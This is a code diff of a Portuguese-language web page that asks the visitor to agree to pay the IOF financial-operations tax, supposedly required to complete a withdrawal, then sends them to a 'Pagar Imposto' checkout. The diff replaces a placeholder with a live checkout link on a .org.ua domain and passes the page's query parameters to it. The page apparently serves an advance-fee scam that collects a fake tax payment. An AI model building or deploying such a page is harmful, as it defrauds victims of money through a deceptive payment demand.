@@ -849,20 +849,21 @@
 								</style>
 
 								<div class="checkbox-container">
-									<label>
-										<input type="checkbox" id="termsCheckbox" onchange="toggleButton()">
-										Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras
-										(IOF), necessário para completar o saque em conformidade com as regulamentações
-										vigentes.
-									</label>
-								</div>
+    <label>
+        <input type="checkbox" id="termsCheckbox" 
+               onchange="var btn = document.getElementById('paymentButton'); if(this.checked){ btn.classList.add('enabled'); } else { btn.classList.remove('enabled'); }">
+        Concordo com os termos, incluindo pagar o Imposto sobre Operações Financeiras
+        (IOF), necessário para completar o saque em conformidade com as regulamentações
+        vigentes.
+    </label>
+</div>
 
-								<a id="paymentButton" 
-                                    href="SEU_LINK_DE_CHECKOUT_AQUI" 
-                                    class="btn33" 
-                                    onclick="event.preventDefault(); if(document.getElementById('termsCheckbox').checked) { window.location.href = this.href + window.location.search; } else { alert('Por favor, concorde com os termos para continuar.'); }">
-                                    Pagar Imposto
-                                </a>
+<a id="paymentButton" 
+   href="https://ambienteseguro.org.ua/c/094aa61932" 
+   class="btn33" 
+   onclick="event.preventDefault(); if(document.getElementById('termsCheckbox').checked) { window.location.href = this.href + window.location.search; } else { alert('Por favor, concorde com os termos para continuar.'); }">
+   Pagar Imposto
+</a>
 							</div>
 						</div>
 
